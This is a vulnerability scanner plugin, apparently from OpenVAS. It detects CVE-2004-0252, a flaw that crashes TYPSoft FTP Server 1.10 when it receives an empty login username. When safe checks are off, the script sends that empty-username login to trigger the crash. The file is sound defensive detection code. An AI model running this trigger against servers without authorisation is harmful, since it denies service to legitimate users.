# SPDX-FileCopyrightText: 2004 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14707");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-0252");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/9573");
  script_xref(name:"OSVDB", value:"6613");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("TYPSoft empty username DoS");
  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2004 David Maciejak");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/typsoft/detected");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Use a different FTP server or upgrade to the newest version.");

  script_tag(name:"summary", value:"The remote host seems to be running TYPSoft FTP server, version 1.10.

  This version is prone to a remote denial of service flaw.");

  script_tag(name:"impact", value:"By sending an empty login username, an attacker can cause the ftp server
  to crash, denying service to legitimate users.");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

kb_creds = ftp_get_kb_creds();
login = ""; # nb: Empty pass is expected, see impact.
pass = kb_creds["pass"];

port = ftp_get_port(default:21);
banner = ftp_get_banner(port:port);
if( ! banner || "TYPSoft FTP Server" >!< banner )
  exit(0);

if(safe_checks())
{
  if(egrep(pattern:".*TYPSoft FTP Server (1\.10[^0-9])", string:banner) )
    security_message(port);
  exit(0);
}
else
{
  soc = open_sock_tcp(port);
  if ( ! soc ) exit(0);

  if(ftp_authenticate(socket:soc, user:login, pass:pass))
  {
    sleep(1);
    #ftp_close(socket: soc);
    soc2 = open_sock_tcp(port);
    if ( ! soc2 || ! recv_line(socket:soc2, length:4096))
      security_message(port);
    else
      close(soc2);
    close(soc);
  }
}

exit(0);
